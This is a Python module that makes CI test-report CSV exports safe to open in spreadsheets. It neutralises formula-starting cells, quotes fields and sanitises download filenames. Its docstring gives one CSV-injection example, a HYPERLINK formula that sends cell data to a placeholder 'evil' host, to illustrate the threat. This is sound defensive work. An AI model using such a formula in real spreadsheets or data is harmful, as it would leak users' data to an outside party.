"""Spreadsheet-safe CSV for server-side exports (EXEC-06).

Every name in an export (test, suite, worker, branch) comes from an ingested CI
report, so it is untrusted: a suite called ``=HYPERLINK("http://evil/?"&A1)``
must open in Excel as that text, not as a live formula.

The cell rules are a port of ``frontend/src/lib/viz/csv.ts``
(``csvCell`` / ``neutraliseCsvValue``) and of its CLI twin
``cli/testlookup_cli/chart_render.py``, so the three writers agree on the same
input:

* a text segment whose first significant character is ``=``, ``+``, ``-`` or
  ``@`` gets a leading ``'``. "Significant" is after Unicode NFKC folding (a
  full-width ``＝`` counts) and after whitespace / format characters a
  spreadsheet may trim. Segments restart after ``;``, tab, CR and LF, because
  some importers split on them, so ``x;=1+1`` is neutralised too;
* a string that spells a plain number (``-5``, ``1e-7``) is left alone: it is
  data, and prefixing it would turn a number into text;
* ``int`` / ``float`` are written as JavaScript's ``String(value)`` writes them
  (``88.0`` is ``88``), ``None`` is the empty cell (never ``0``), a datetime is
  its ISO 8601 UTC instant, a bool ``true`` / ``false``;
* a field holding ``"`` ``,`` ``;`` tab, CR or LF is quoted, ``"`` doubled.

The FILE matches the UI's chart export (``CSV_BOM`` + CRLF rows): it is a
download a person opens with a double-click, and Excel needs the BOM to read a
UTF-8 suite name as UTF-8.
"""
from __future__ import annotations

import math
import re
import unicodedata
import uuid
from datetime import date, datetime, timezone
from decimal import Decimal
from enum import Enum
from typing import Any, Iterable, Iterator, Sequence

#: Excel reads a UTF-8 file as UTF-8 only with this first.
CSV_BOM = "﻿"
#: RFC 4180 line end, as the UI's export writes it.
LINE_END = "\r\n"

#: A string spreadsheets read as exactly the number it spells. ASCII digits only.
_PLAIN_NUMBER = re.compile(r"-?(?:[0-9]+\.?[0-9]*|\.[0-9]+)(?:[eE][-+]?[0-9]+)?")
_FORMULA_START = frozenset("=+-@")
_SEGMENT_BREAK = re.compile(r"[;\t\r\n]")
_MUST_QUOTE = re.compile(r'[",;\t\r\n]')


def _ignored_lead(ch: str, after_break: bool) -> bool:
    """What a spreadsheet may trim before it looks at a cell's first character."""
    if after_break and ch == '"':
        return True
    return ch.isspace() or unicodedata.category(ch) in ("Zs", "Cf")


def _starts_formula(segment: str, after_break: bool) -> bool:
    if _PLAIN_NUMBER.fullmatch(segment):
        return False
    folded = unicodedata.normalize("NFKC", segment)
    start = 0
    while start < len(folded) and _ignored_lead(folded[start], after_break):
        start += 1
    return start < len(folded) and folded[start] in _FORMULA_START


def raw_number(value: float) -> str:
    """A number as JavaScript's ``String(value)`` writes it (``88.0`` -> ``88``,
    ``1e-7`` -> ``1e-7``), so this file and the UI's exports agree."""
    if isinstance(value, int):
        return str(value)
    if not math.isfinite(value):
        return "NaN" if math.isnan(value) else ("Infinity" if value > 0 else "-Infinity")
    if value == 0:
        return "0"
    sign = "-" if value < 0 else ""
    parts = Decimal(repr(abs(value))).normalize().as_tuple()
    digits = "".join(str(digit) for digit in parts.digits)
    size = len(digits)
    point = int(parts.exponent) + size
    if size <= point <= 21:
        return sign + digits + "0" * (point - size)
    if 0 < point <= 21:
        return sign + digits[:point] + "." + digits[point:]
    if -6 < point <= 0:
        return sign + "0." + "0" * -point + digits
    exponent = point - 1
    mantissa = digits[0] + ("." + digits[1:] if size > 1 else "")
    return f"{sign}{mantissa}e{'+' if exponent >= 0 else '-'}{abs(exponent)}"


def _instant(value: datetime) -> str:
    """An ISO 8601 UTC instant; a naive datetime is taken to be UTC already."""
    if value.tzinfo is None:
        value = value.replace(tzinfo=timezone.utc)
    return value.astimezone(timezone.utc).isoformat()


def neutralise_csv_value(value: Any) -> str:
    """``value`` made inert for a spreadsheet, unquoted. ``None`` is ``''``."""
    if value is None:
        return ""
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, (int, float)):
        return raw_number(value)
    if isinstance(value, Decimal):
        return raw_number(float(value))
    if isinstance(value, datetime):
        return _instant(value)
    if isinstance(value, date):
        return value.isoformat()
    if isinstance(value, uuid.UUID):
        return str(value)
    if isinstance(value, Enum):
        value = value.value
    rest = str(value)
    if rest[:1] in _CONTROL_LEAD:
        # Stricter than the UI writer, as the server's other exporters are
        # (``audit_dashboard_service._csv_text``): a cell that BEGINS with a
        # tab or CR is prefixed whatever follows, since an importer that trims
        # it would otherwise see what comes next as the first character.
        return "'" + _neutralise_text(rest)
    return _neutralise_text(rest)


#: Leading characters prefixed outright (the OWASP CSV-injection list's tab / CR).
_CONTROL_LEAD = ("\t", "\r")


def _neutralise_text(rest: str) -> str:
    out: list[str] = []
    after_break = False
    while True:
        found = _SEGMENT_BREAK.search(rest)
        segment = rest if found is None else rest[: found.start()]
        out.append(f"'{segment}" if _starts_formula(segment, after_break) else segment)
        if found is None:
            return "".join(out)
        out.append(rest[found.start()])
        rest = rest[found.start() + 1:]
        after_break = True


def csv_cell(value: Any) -> str:
    """One CSV field: neutralised, then quoted when it must be."""
    text = neutralise_csv_value(value)
    return '"' + text.replace('"', '""') + '"' if _MUST_QUOTE.search(text) else text


def csv_line(values: Iterable[Any]) -> str:
    """One CSV record, line end included."""
    return ",".join(csv_cell(value) for value in values) + LINE_END


def iter_csv(
    columns: Sequence[str], rows: Iterable[Sequence[Any]], *, chunk_rows: int = 500,
) -> Iterator[str]:
    """The file as chunks of text: BOM + header first, then ``chunk_rows``
    records at a time, so a streamed response never holds the whole file."""
    yield CSV_BOM + csv_line(columns)
    buffer: list[str] = []
    for row in rows:
        buffer.append(csv_line(row))
        if len(buffer) >= chunk_rows:
            yield "".join(buffer)
            buffer = []
    if buffer:
        yield "".join(buffer)


#: A filename segment: what is left is safe in a Content-Disposition header
#: on every desktop OS without RFC 5987 encoding.
_FILENAME_UNSAFE = re.compile(r"[^A-Za-z0-9._-]+")


def filename_segment(value: Any, *, fallback: str, max_length: int = 60) -> str:
    """``value`` reduced to ``[A-Za-z0-9._-]`` (runs of anything else become
    ``_``), trimmed of leading dots and edge ``_``/``-``; ``fallback`` when
    nothing is left. A build number is ingested text: it must not be able to
    break the header (a quote, CR/LF) or the saved name (a ``/``)."""
    text = _FILENAME_UNSAFE.sub("_", str(value or "")).strip("._-")[:max_length].strip("._-")
    return text or fallback


__all__ = [
    "CSV_BOM",
    "LINE_END",
    "csv_cell",
    "csv_line",
    "filename_segment",
    "iter_csv",
    "neutralise_csv_value",
    "raw_number",
]
